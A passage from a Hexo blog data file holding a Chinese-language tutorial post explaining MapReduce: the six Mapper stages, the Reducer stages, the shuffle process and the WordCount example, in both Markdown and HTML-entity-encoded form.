第四阶段是按照一定的规则对第三阶段输出的键值对进行分区。比较是基于键进行的。比如我们的键表示省份(如北京、上海、山东等)，那么就可以按照不同省份进行分区，同一个省份的键值对划分到一个区中。**默认是只有一个区。分区的数量就是Reducer任务运行的数量。默认只有一个Reducer任务。**\n\n- 第五阶段是对每个分区中的键值对进行排序。首先，按照键进行排序，对于键相同的键值对，按照值进行排序。比如三个键值对<2,2>、<1,3>、<2,1>，键和值分别是整数。那么排序后的结果是<1,3>、<2,1>、<2,2>。如果有第六阶段，那么进入第六阶段；如果没有，直接输出到本地的linux文件中。\n\n- 第六阶段是对数据进行归约处理，也就是reduce处理。**键相等的键值对会调用一次reduce方法。**经过这一阶段，数据量会减少。归约后的数据输出到本地的linxu文件中。**本阶段默认是没有的，需要用户自己增加这一阶段的代码。**\n\n- - -\n### Reducer任务详解\n\n每个Reducer任务是一个java进程。Reducer任务接收Mapper任务的输出，归约处理后写入到HDFS中，可以分为如下图所示的几个阶段。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/3.png)\n\n- 第一阶段是Reducer任务会主动从Mapper任务复制其输出的键值对。Mapper任务可能会有很多，因此Reducer会复制多个Mapper的输出。\n\n- 第二阶段是把复制到Reducer本地数据，全部进行合并，即把分散的数据合并成一个大的数据。再对合并后的数据排序。\n\n- 第三阶段是对排序后的键值对调用reduce方法。**键相等的键值对调用一次reduce方法**，每次调用会产生零个或者多个键值对。最后把这些输出的键值对写入到HDFS文件中。\n\n- - -\n### Shuffle——MapReduce核心\n\n**Shuffle过程是MapReduce的核心，也被称为奇迹发生的地方。**\nShuffle过程：将map的输出作为reduce的输入的过程。\n\n下面这些文章可能对大家有所帮助：\nhttp://my.oschina.net/u/2003855/blog/310301\nhttp://blog.csdn.net/thomas0yang/article/details/8562910\n\n- - -\n### WordCount单词计数\n单词计数是最简单也是最能体现MapReduce思想的程序之一，可以称为MapReduce版\"Hello World\"。\n单词计数主要完成功能是：统计一系列文本文件中每个单词出现的次数。\n**以下是相关图解，可以结合上文执行过程进行理解。**\n\n![分片后解析为键值对](http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/4.png)\n![map](http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/5.png)\n![分区排序合并](http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/6.png)\n![reduce](http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/7.png)","source":"_posts/MapReduce详解.md","raw":"---\ntitle: MapReduce详解\ncategories:\n  - 算法及理论\ntags:\n  - 大数据\ndate: 2016-5-17 21:18:00\n\n---\n\n### MapReduce\nMapReduce是一种编程模型，用于大规模数据集（大于1TB）的并行运算。概念\"Map（映射）\"和\"Reduce（归约）\"，是它们的主要思想，都是从函数式编程语言里借来的，还有从矢量编程语言里借来的特性。**它极大地方便了编程人员在不会分布式并行编程的情况下，将自己的程序运行在分布式系统上。**\n\n### 分析MapReduce执行过程\n\nMapReduce运行的时候，会通过Mapper运行的任务读取HDFS中的数据文件，然后调用自己的方法，处理数据，最后输出。Reducer任务会接收Mapper任务输出的数据，作为自己的输入数据，调用自己的方法，最后输出到HDFS的文件中。整个流程如图：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/1.png)\n\n- - -\n### Mapper任务详解\n\n**每个Mapper任务是一个java进程**，它会读取HDFS中的文件，解析成很多的键值对，经过我们覆盖的map方法处理后，转换为很多的键值对再输出。整个Mapper任务的处理过程又可以分为以下几个阶段，如图所示。\n\n<!-- more -->\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/2.png)\n\n在上图中，把Mapper任务的运行过程分为六个阶段。\n\n- 第一阶段是把输入文件按照一定的标准进行分片(InputSplit)，每个输入片的大小是固定的。默认情况下，输入片(InputSplit)的大小与数据块(Block)的大小是相同的。如果数据块(Block)的大小是默认值64MB，输入文件有两个，一个是32MB，一个是72MB。那么小的文件是一个输入片，大文件会分为两个数据块，那么是两个输入片。一共产生三个输入片。**每一个输入片由一个Mapper进程处理**。这里的三个输入片，会有三个Mapper进程处理。\n\n- 第二阶段是对输入片中的记录按照一定的规则解析成键值对。有个默认规则是把每一行文本内容解析成键值对。“键”是每一行的起始位置(单位是字节)，“值”是本行的文本内容。\n\n- 第三阶段是调用Mapper类中的map方法。第二阶段中解析出来的每一个键值对，调用一次map方法。如果有1000个键值对，就会调用1000次map方法。每一次调用map方法会输出零个或者多个键值对。\n\n- 第四阶段是按照一定的规则对第三阶段输出的键值对进行分区。比较是基于键进行的。比如我们的键表示省份(如北京、上海、山东等)，那么就可以按照不同省份进行分区，同一个省份的键值对划分到一个区中。**默认是只有一个区。分区的数量就是Reducer任务运行的数量。默认只有一个Reducer任务。**\n\n- 第五阶段是对每个分区中的键值对进行排序。首先，按照键进行排序，对于键相同的键值对，按照值进行排序。比如三个键值对<2,2>、<1,3>、<2,1>，键和值分别是整数。那么排序后的结果是<1,3>、<2,1>、<2,2>。如果有第六阶段，那么进入第六阶段；如果没有，直接输出到本地的linux文件中。\n\n- 第六阶段是对数据进行归约处理，也就是reduce处理。**键相等的键值对会调用一次reduce方法。**经过这一阶段，数据量会减少。归约后的数据输出到本地的linxu文件中。**本阶段默认是没有的，需要用户自己增加这一阶段的代码。**\n\n- - -\n### Reducer任务详解\n\n每个Reducer任务是一个java进程。Reducer任务接收Mapper任务的输出，归约处理后写入到HDFS中，可以分为如下图所示的几个阶段。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/3.png)\n\n- 第一阶段是Reducer任务会主动从Mapper任务复制其输出的键值对。Mapper任务可能会有很多，因此Reducer会复制多个Mapper的输出。\n\n- 第二阶段是把复制到Reducer本地数据，全部进行合并，即把分散的数据合并成一个大的数据。再对合并后的数据排序。\n\n- 第三阶段是对排序后的键值对调用reduce方法。**键相等的键值对调用一次reduce方法**，每次调用会产生零个或者多个键值对。最后把这些输出的键值对写入到HDFS文件中。\n\n- - -\n### Shuffle——MapReduce核心\n\n**Shuffle过程是MapReduce的核心，也被称为奇迹发生的地方。**\nShuffle过程：将map的输出作为reduce的输入的过程。\n\n下面这些文章可能对大家有所帮助：\nhttp://my.oschina.net/u/2003855/blog/310301\nhttp://blog.csdn.net/thomas0yang/article/details/8562910\n\n- - -\n### WordCount单词计数\n单词计数是最简单也是最能体现MapReduce思想的程序之一，可以称为MapReduce版\"Hello World\"。\n单词计数主要完成功能是：统计一系列文本文件中每个单词出现的次数。\n**以下是相关图解，可以结合上文执行过程进行理解。**\n\n![分片后解析为键值对](http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/4.png)\n![map](http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/5.png)\n![分区排序合并](http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/6.png)\n![reduce](http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/7.png)","slug":"MapReduce详解","published":1,"updated":"2016-11-19T02:03:47.367Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulb80012gwtmdb3yccep","content":"<h3 id=\"MapReduce\"><a href=\"#MapReduce\" class=\"headerlink\" title=\"MapReduce\"></a>MapReduce</h3><p>MapReduce&#x662F;&#x4E00;&#x79CD;&#x7F16;&#x7A0B;&#x6A21;&#x578B;&#xFF0C;&#x7528;&#x4E8E;&#x5927;&#x89C4;&#x6A21;&#x6570;&#x636E;&#x96C6;&#xFF08;&#x5927;&#x4E8E;1TB&#xFF09;&#x7684;&#x5E76;&#x884C;&#x8FD0;&#x7B97;&#x3002;&#x6982;&#x5FF5;&#x201D;Map&#xFF08;&#x6620;&#x5C04;&#xFF09;&#x201D;&#x548C;&#x201D;Reduce&#xFF08;&#x5F52;&#x7EA6;&#xFF09;&#x201D;&#xFF0C;&#x662F;&#x5B83;&#x4EEC;&#x7684;&#x4E3B;&#x8981;&#x601D;&#x60F3;&#xFF0C;&#x90FD;&#x662F;&#x4ECE;&#x51FD;&#x6570;&#x5F0F;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x91CC;&#x501F;&#x6765;&#x7684;&#xFF0C;&#x8FD8;&#x6709;&#x4ECE;&#x77E2;&#x91CF;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x91CC;&#x501F;&#x6765;&#x7684;&#x7279;&#x6027;&#x3002;<strong>&#x5B83;&#x6781;&#x5927;&#x5730;&#x65B9;&#x4FBF;&#x4E86;&#x7F16;&#x7A0B;&#x4EBA;&#x5458;&#x5728;&#x4E0D;&#x4F1A;&#x5206;&#x5E03;&#x5F0F;&#x5E76;&#x884C;&#x7F16;&#x7A0B;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5C06;&#x81EA;&#x5DF1;&#x7684;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E0A;&#x3002;</strong></p>\n<h3 id=\"&#x5206;&#x6790;MapReduce&#x6267;&#x884C;&#x8FC7;&#x7A0B;\"><a href=\"#&#x5206;&#x6790;MapReduce&#x6267;&#x884C;&#x8FC7;&#x7A0B;\" class=\"headerlink\" title=\"&#x5206;&#x6790;MapReduce&#x6267;&#x884C;&#x8FC7;&#x7A0B;\"></a>&#x5206;&#x6790;MapReduce&#x6267;&#x884C;&#x8FC7;&#x7A0B;</h3><p>MapReduce&#x8FD0;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x901A;&#x8FC7;Mapper&#x8FD0;&#x884C;&#x7684;&#x4EFB;&#x52A1;&#x8BFB;&#x53D6;HDFS&#x4E2D;&#x7684;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x8C03;&#x7528;&#x81EA;&#x5DF1;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5904;&#x7406;&#x6570;&#x636E;&#xFF0C;&#x6700;&#x540E;&#x8F93;&#x51FA;&#x3002;Reducer&#x4EFB;&#x52A1;&#x4F1A;&#x63A5;&#x6536;Mapper&#x4EFB;&#x52A1;&#x8F93;&#x51FA;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4F5C;&#x4E3A;&#x81EA;&#x5DF1;&#x7684;&#x8F93;&#x5165;&#x6570;&#x636E;&#xFF0C;&#x8C03;&#x7528;&#x81EA;&#x5DF1;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x6700;&#x540E;&#x8F93;&#x51FA;&#x5230;HDFS&#x7684;&#x6587;&#x4EF6;&#x4E2D;&#x3002;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x5982;&#x56FE;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/1.png\" alt=\"\"></p>\n<hr>\n<h3 id=\"Mapper&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;\"><a href=\"#Mapper&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;\" class=\"headerlink\" title=\"Mapper&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;\"></a>Mapper&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;</h3><p><strong>&#x6BCF;&#x4E2A;Mapper&#x4EFB;&#x52A1;&#x662F;&#x4E00;&#x4E2A;java&#x8FDB;&#x7A0B;</strong>&#xFF0C;&#x5B83;&#x4F1A;&#x8BFB;&#x53D6;HDFS&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x89E3;&#x6790;&#x6210;&#x5F88;&#x591A;&#x7684;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x7ECF;&#x8FC7;&#x6211;&#x4EEC;&#x8986;&#x76D6;&#x7684;map&#x65B9;&#x6CD5;&#x5904;&#x7406;&#x540E;&#xFF0C;&#x8F6C;&#x6362;&#x4E3A;&#x5F88;&#x591A;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x518D;&#x8F93;&#x51FA;&#x3002;&#x6574;&#x4E2A;Mapper&#x4EFB;&#x52A1;&#x7684;&#x5904;&#x7406;&#x8FC7;&#x7A0B;&#x53C8;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x9636;&#x6BB5;&#xFF0C;&#x5982;&#x56FE;&#x6240;&#x793A;&#x3002;</p>\n<a id=\"more\"></a>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/2.png\" alt=\"\"></p>\n<p>&#x5728;&#x4E0A;&#x56FE;&#x4E2D;&#xFF0C;&#x628A;Mapper&#x4EFB;&#x52A1;&#x7684;&#x8FD0;&#x884C;&#x8FC7;&#x7A0B;&#x5206;&#x4E3A;&#x516D;&#x4E2A;&#x9636;&#x6BB5;&#x3002;</p>\n<ul>\n<li><p>&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x662F;&#x628A;&#x8F93;&#x5165;&#x6587;&#x4EF6;&#x6309;&#x7167;&#x4E00;&#x5B9A;&#x7684;&#x6807;&#x51C6;&#x8FDB;&#x884C;&#x5206;&#x7247;(InputSplit)&#xFF0C;&#x6BCF;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#x7684;&#x5927;&#x5C0F;&#x662F;&#x56FA;&#x5B9A;&#x7684;&#x3002;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8F93;&#x5165;&#x7247;(InputSplit)&#x7684;&#x5927;&#x5C0F;&#x4E0E;&#x6570;&#x636E;&#x5757;(Block)&#x7684;&#x5927;&#x5C0F;&#x662F;&#x76F8;&#x540C;&#x7684;&#x3002;&#x5982;&#x679C;&#x6570;&#x636E;&#x5757;(Block)&#x7684;&#x5927;&#x5C0F;&#x662F;&#x9ED8;&#x8BA4;&#x503C;64MB&#xFF0C;&#x8F93;&#x5165;&#x6587;&#x4EF6;&#x6709;&#x4E24;&#x4E2A;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;32MB&#xFF0C;&#x4E00;&#x4E2A;&#x662F;72MB&#x3002;&#x90A3;&#x4E48;&#x5C0F;&#x7684;&#x6587;&#x4EF6;&#x662F;&#x4E00;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#xFF0C;&#x5927;&#x6587;&#x4EF6;&#x4F1A;&#x5206;&#x4E3A;&#x4E24;&#x4E2A;&#x6570;&#x636E;&#x5757;&#xFF0C;&#x90A3;&#x4E48;&#x662F;&#x4E24;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#x3002;&#x4E00;&#x5171;&#x4EA7;&#x751F;&#x4E09;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#x3002;<strong>&#x6BCF;&#x4E00;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#x7531;&#x4E00;&#x4E2A;Mapper&#x8FDB;&#x7A0B;&#x5904;&#x7406;</strong>&#x3002;&#x8FD9;&#x91CC;&#x7684;&#x4E09;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#xFF0C;&#x4F1A;&#x6709;&#x4E09;&#x4E2A;Mapper&#x8FDB;&#x7A0B;&#x5904;&#x7406;&#x3002;</p>\n</li>\n<li><p>&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x662F;&#x5BF9;&#x8F93;&#x5165;&#x7247;&#x4E2D;&#x7684;&#x8BB0;&#x5F55;&#x6309;&#x7167;&#x4E00;&#x5B9A;&#x7684;&#x89C4;&#x5219;&#x89E3;&#x6790;&#x6210;&#x952E;&#x503C;&#x5BF9;&#x3002;&#x6709;&#x4E2A;&#x9ED8;&#x8BA4;&#x89C4;&#x5219;&#x662F;&#x628A;&#x6BCF;&#x4E00;&#x884C;&#x6587;&#x672C;&#x5185;&#x5BB9;&#x89E3;&#x6790;&#x6210;&#x952E;&#x503C;&#x5BF9;&#x3002;&#x201C;&#x952E;&#x201D;&#x662F;&#x6BCF;&#x4E00;&#x884C;&#x7684;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;(&#x5355;&#x4F4D;&#x662F;&#x5B57;&#x8282;)&#xFF0C;&#x201C;&#x503C;&#x201D;&#x662F;&#x672C;&#x884C;&#x7684;&#x6587;&#x672C;&#x5185;&#x5BB9;&#x3002;</p>\n</li>\n<li><p>&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#x662F;&#x8C03;&#x7528;Mapper&#x7C7B;&#x4E2D;&#x7684;map&#x65B9;&#x6CD5;&#x3002;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x4E2D;&#x89E3;&#x6790;&#x51FA;&#x6765;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x8C03;&#x7528;&#x4E00;&#x6B21;map&#x65B9;&#x6CD5;&#x3002;&#x5982;&#x679C;&#x6709;1000&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x5C31;&#x4F1A;&#x8C03;&#x7528;1000&#x6B21;map&#x65B9;&#x6CD5;&#x3002;&#x6BCF;&#x4E00;&#x6B21;&#x8C03;&#x7528;map&#x65B9;&#x6CD5;&#x4F1A;&#x8F93;&#x51FA;&#x96F6;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#x3002;</p>\n</li>\n<li><p>&#x7B2C;&#x56DB;&#x9636;&#x6BB5;&#x662F;&#x6309;&#x7167;&#x4E00;&#x5B9A;&#x7684;&#x89C4;&#x5219;&#x5BF9;&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#x8F93;&#x51FA;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x8FDB;&#x884C;&#x5206;&#x533A;&#x3002;&#x6BD4;&#x8F83;&#x662F;&#x57FA;&#x4E8E;&#x952E;&#x8FDB;&#x884C;&#x7684;&#x3002;&#x6BD4;&#x5982;&#x6211;&#x4EEC;&#x7684;&#x952E;&#x8868;&#x793A;&#x7701;&#x4EFD;(&#x5982;&#x5317;&#x4EAC;&#x3001;&#x4E0A;&#x6D77;&#x3001;&#x5C71;&#x4E1C;&#x7B49;)&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x6309;&#x7167;&#x4E0D;&#x540C;&#x7701;&#x4EFD;&#x8FDB;&#x884C;&#x5206;&#x533A;&#xFF0C;&#x540C;&#x4E00;&#x4E2A;&#x7701;&#x4EFD;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x5212;&#x5206;&#x5230;&#x4E00;&#x4E2A;&#x533A;&#x4E2D;&#x3002;<strong>&#x9ED8;&#x8BA4;&#x662F;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x533A;&#x3002;&#x5206;&#x533A;&#x7684;&#x6570;&#x91CF;&#x5C31;&#x662F;Reducer&#x4EFB;&#x52A1;&#x8FD0;&#x884C;&#x7684;&#x6570;&#x91CF;&#x3002;&#x9ED8;&#x8BA4;&#x53EA;&#x6709;&#x4E00;&#x4E2A;Reducer&#x4EFB;&#x52A1;&#x3002;</strong></p>\n</li>\n<li><p>&#x7B2C;&#x4E94;&#x9636;&#x6BB5;&#x662F;&#x5BF9;&#x6BCF;&#x4E2A;&#x5206;&#x533A;&#x4E2D;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#x3002;&#x9996;&#x5148;&#xFF0C;&#x6309;&#x7167;&#x952E;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#xFF0C;&#x5BF9;&#x4E8E;&#x952E;&#x76F8;&#x540C;&#x7684;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x6309;&#x7167;&#x503C;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#x3002;&#x6BD4;&#x5982;&#x4E09;&#x4E2A;&#x952E;&#x503C;&#x5BF9;<2,2>&#x3001;<1,3>&#x3001;<2,1>&#xFF0C;&#x952E;&#x548C;&#x503C;&#x5206;&#x522B;&#x662F;&#x6574;&#x6570;&#x3002;&#x90A3;&#x4E48;&#x6392;&#x5E8F;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x662F;<1,3>&#x3001;<2,1>&#x3001;<2,2>&#x3002;&#x5982;&#x679C;&#x6709;&#x7B2C;&#x516D;&#x9636;&#x6BB5;&#xFF0C;&#x90A3;&#x4E48;&#x8FDB;&#x5165;&#x7B2C;&#x516D;&#x9636;&#x6BB5;&#xFF1B;&#x5982;&#x679C;&#x6CA1;&#x6709;&#xFF0C;&#x76F4;&#x63A5;&#x8F93;&#x51FA;&#x5230;&#x672C;&#x5730;&#x7684;linux&#x6587;&#x4EF6;&#x4E2D;&#x3002;</2,2></2,1></1,3></2,1></1,3></2,2></p>\n</li>\n<li><p>&#x7B2C;&#x516D;&#x9636;&#x6BB5;&#x662F;&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5F52;&#x7EA6;&#x5904;&#x7406;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;reduce&#x5904;&#x7406;&#x3002;<strong>&#x952E;&#x76F8;&#x7B49;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x4F1A;&#x8C03;&#x7528;&#x4E00;&#x6B21;reduce&#x65B9;&#x6CD5;&#x3002;</strong>&#x7ECF;&#x8FC7;&#x8FD9;&#x4E00;&#x9636;&#x6BB5;&#xFF0C;&#x6570;&#x636E;&#x91CF;&#x4F1A;&#x51CF;&#x5C11;&#x3002;&#x5F52;&#x7EA6;&#x540E;&#x7684;&#x6570;&#x636E;&#x8F93;&#x51FA;&#x5230;&#x672C;&#x5730;&#x7684;linxu&#x6587;&#x4EF6;&#x4E2D;&#x3002;<strong>&#x672C;&#x9636;&#x6BB5;&#x9ED8;&#x8BA4;&#x662F;&#x6CA1;&#x6709;&#x7684;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x6237;&#x81EA;&#x5DF1;&#x589E;&#x52A0;&#x8FD9;&#x4E00;&#x9636;&#x6BB5;&#x7684;&#x4EE3;&#x7801;&#x3002;</strong></p>\n</li>\n</ul>\n<hr>\n<h3 id=\"Reducer&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;\"><a href=\"#Reducer&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;\" class=\"headerlink\" title=\"Reducer&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;\"></a>Reducer&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;</h3><p>&#x6BCF;&#x4E2A;Reducer&#x4EFB;&#x52A1;&#x662F;&#x4E00;&#x4E2A;java&#x8FDB;&#x7A0B;&#x3002;Reducer&#x4EFB;&#x52A1;&#x63A5;&#x6536;Mapper&#x4EFB;&#x52A1;&#x7684;&#x8F93;&#x51FA;&#xFF0C;&#x5F52;&#x7EA6;&#x5904;&#x7406;&#x540E;&#x5199;&#x5165;&#x5230;HDFS&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#x7684;&#x51E0;&#x4E2A;&#x9636;&#x6BB5;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/3.png\" alt=\"\"></p>\n<ul>\n<li><p>&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x662F;Reducer&#x4EFB;&#x52A1;&#x4F1A;&#x4E3B;&#x52A8;&#x4ECE;Mapper&#x4EFB;&#x52A1;&#x590D;&#x5236;&#x5176;&#x8F93;&#x51FA;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x3002;Mapper&#x4EFB;&#x52A1;&#x53EF;&#x80FD;&#x4F1A;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x56E0;&#x6B64;Reducer&#x4F1A;&#x590D;&#x5236;&#x591A;&#x4E2A;Mapper&#x7684;&#x8F93;&#x51FA;&#x3002;</p>\n</li>\n<li><p>&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x662F;&#x628A;&#x590D;&#x5236;&#x5230;Reducer&#x672C;&#x5730;&#x6570;&#x636E;&#xFF0C;&#x5168;&#x90E8;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#xFF0C;&#x5373;&#x628A;&#x5206;&#x6563;&#x7684;&#x6570;&#x636E;&#x5408;&#x5E76;&#x6210;&#x4E00;&#x4E2A;&#x5927;&#x7684;&#x6570;&#x636E;&#x3002;&#x518D;&#x5BF9;&#x5408;&#x5E76;&#x540E;&#x7684;&#x6570;&#x636E;&#x6392;&#x5E8F;&#x3002;</p>\n</li>\n<li><p>&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#x662F;&#x5BF9;&#x6392;&#x5E8F;&#x540E;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x8C03;&#x7528;reduce&#x65B9;&#x6CD5;&#x3002;<strong>&#x952E;&#x76F8;&#x7B49;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x8C03;&#x7528;&#x4E00;&#x6B21;reduce&#x65B9;&#x6CD5;</strong>&#xFF0C;&#x6BCF;&#x6B21;&#x8C03;&#x7528;&#x4F1A;&#x4EA7;&#x751F;&#x96F6;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#x3002;&#x6700;&#x540E;&#x628A;&#x8FD9;&#x4E9B;&#x8F93;&#x51FA;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x5199;&#x5165;&#x5230;HDFS&#x6587;&#x4EF6;&#x4E2D;&#x3002;</p>\n</li>\n</ul>\n<hr>\n<h3 id=\"Shuffle&#x2014;&#x2014;MapReduce&#x6838;&#x5FC3;\"><a href=\"#Shuffle&#x2014;&#x2014;MapReduce&#x6838;&#x5FC3;\" class=\"headerlink\" title=\"Shuffle&#x2014;&#x2014;MapReduce&#x6838;&#x5FC3;\"></a>Shuffle&#x2014;&#x2014;MapReduce&#x6838;&#x5FC3;</h3><p><strong>Shuffle&#x8FC7;&#x7A0B;&#x662F;MapReduce&#x7684;&#x6838;&#x5FC3;&#xFF0C;&#x4E5F;&#x88AB;&#x79F0;&#x4E3A;&#x5947;&#x8FF9;&#x53D1;&#x751F;&#x7684;&#x5730;&#x65B9;&#x3002;</strong><br>Shuffle&#x8FC7;&#x7A0B;&#xFF1A;&#x5C06;map&#x7684;&#x8F93;&#x51FA;&#x4F5C;&#x4E3A;reduce&#x7684;&#x8F93;&#x5165;&#x7684;&#x8FC7;&#x7A0B;&#x3002;</p>\n<p>&#x4E0B;&#x9762;&#x8FD9;&#x4E9B;&#x6587;&#x7AE0;&#x53EF;&#x80FD;&#x5BF9;&#x5927;&#x5BB6;&#x6709;&#x6240;&#x5E2E;&#x52A9;&#xFF1A;<br><a href=\"http://my.oschina.net/u/2003855/blog/310301\" target=\"_blank\" rel=\"external\">http://my.oschina.net/u/2003855/blog/310301</a><br><a href=\"http://blog.csdn.net/thomas0yang/article/details/8562910\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/thomas0yang/article/details/8562910</a></p>\n<hr>\n<h3 id=\"WordCount&#x5355;&#x8BCD;&#x8BA1;&#x6570;\"><a href=\"#WordCount&#x5355;&#x8BCD;&#x8BA1;&#x6570;\" class=\"headerlink\" title=\"WordCount&#x5355;&#x8BCD;&#x8BA1;&#x6570;\"></a>WordCount&#x5355;&#x8BCD;&#x8BA1;&#x6570;</h3><p>&#x5355;&#x8BCD;&#x8BA1;&#x6570;&#x662F;&#x6700;&#x7B80;&#x5355;&#x4E5F;&#x662F;&#x6700;&#x80FD;&#x4F53;&#x73B0;MapReduce&#x601D;&#x60F3;&#x7684;&#x7A0B;&#x5E8F;&#x4E4B;&#x4E00;&#xFF0C;&#x53EF;&#x4EE5;&#x79F0;&#x4E3A;MapReduce&#x7248;&#x201D;Hello World&#x201D;&#x3002;<br>&#x5355;&#x8BCD;&#x8BA1;&#x6570;&#x4E3B;&#x8981;&#x5B8C;&#x6210;&#x529F;&#x80FD;&#x662F;&#xFF1A;&#x7EDF;&#x8BA1;&#x4E00;&#x7CFB;&#x5217;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x4E2D;&#x6BCF;&#x4E2A;&#x5355;&#x8BCD;&#x51FA;&#x73B0;&#x7684;&#x6B21;&#x6570;&#x3002;<br><strong>&#x4EE5;&#x4E0B;&#x662F;&#x76F8;&#x5173;&#x56FE;&#x89E3;&#xFF0C;&#x53EF;&#x4EE5;&#x7ED3;&#x5408;&#x4E0A;&#x6587;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x8FDB;&#x884C;&#x7406;&#x89E3;&#x3002;</strong></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/4.png\" alt=\"&#x5206;&#x7247;&#x540E;&#x89E3;&#x6790;&#x4E3A;&#x952E;&#x503C;&#x5BF9;\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/5.png\" alt=\"map\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/6.png\" alt=\"&#x5206;&#x533A;&#x6392;&#x5E8F;&#x5408;&#x5E76;\"><br><img 